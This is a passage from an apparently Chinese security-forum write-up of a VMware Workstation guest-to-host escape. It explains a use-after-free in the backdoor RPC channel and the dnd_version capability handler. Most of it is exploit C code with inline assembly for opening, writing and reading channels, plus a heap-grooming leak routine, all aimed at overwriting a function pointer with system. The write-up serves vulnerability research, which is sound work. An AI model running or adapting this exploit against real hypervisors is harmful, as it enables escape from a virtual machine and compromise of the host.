v8 <span class="token operator">=</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Invalid protocol version."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_171460</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token function">sub_4723A0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v9 <span class="token operator">+</span> <span class="token number">360</span><span class="token punctuation">)</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_472380</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_1711E0</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>theCurrentVM <span class="token operator">+</span> <span class="token number">104LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_12FA20</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">"Failed to set VMDB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v13<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token function">Tools_SetGuestDnDCapable</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">set_reply</span><span class="token punctuation">(</span>reply<span class="token punctuation">,</span> reply_len<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>传入一个参数代表版本，如果不符合则销毁之前的结构体，创建一个新的结构体。更新在<code>vmx.capability.dnd_version</code>也有对应实现。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bb838684db02dce7205e00d839ff208fed7e2264.png" alt="图片.png"></p><p>追踪函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6bea8ffd78640f22c86266f875cf6f17ba55736.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-028a1df016d78ca5454c36d7bdd28d0c504175cb.png" alt="图片.png"></p><p>那么可以猜到新的结构体大小总是为0xa8。可以通过该方法，控制buf的大小为0xa8，销毁原来的object获得新的object的时候，把channel B的UAF chunk申请出来，然后利用channel C leak libc基址。</p><p>有了leak，利用起来就简单了，直接改fd，然后劫持到bss段，改掉某一个函数指针为system即可。</p><p>新的leak方式如下</p><ul><li>开启channel A和channel B</li><li>A的输出缓冲区为bufA,A利用漏洞free bufA</li><li>然后B给guest发送out put，这时候控制B的buf大小和A一样，此时free的A再次被malloc出来</li><li>释放A，同时buf A被再次释放，此时调用<code>vmx.capability.dnd_version</code>，虚表在此时被写入bufB</li><li>leak出process base 然后根据偏移即可计算出system 以及一些函数指针的地址。</li></ul><p>最后以相同的方式，劫持fd即可,下面的exp是长亭师傅的，根据通信原理实现了一套通信机制，具体内容看参考，不赘述。</p><p>exp：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0xc9435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0003001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"movl %%ebx,(%%r11)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> offset<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0004001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"in %%dx,%%eax\n\t"</span>        <span class="token string">"add %%r11,%%rbp\n\t"</span>        <span class="token string">"movl %%ebx,(%%rbp)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x1,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movq $0x21,%%rbx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0005001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_close</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rcx,%%r10\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0006001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span 